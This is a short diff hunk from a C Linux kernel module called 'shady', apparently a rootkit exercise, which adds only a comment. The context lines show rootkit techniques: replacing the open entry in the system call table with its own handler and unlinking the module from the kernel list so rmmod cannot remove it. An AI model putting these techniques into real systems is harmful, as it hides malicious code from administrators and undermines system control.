@@ -286,6 +286,8 @@ shady_init_module(void)
   ((unsigned long long**)system_call_table_address)[__NR_open] = (unsigned long long *)my_open;
 
   /* Hide shady. rmmod will no longer work. */
+  /* I saw this in modprobe.c */
+  
   mod = find_module("shady");
   list_del(&mod->list);
 
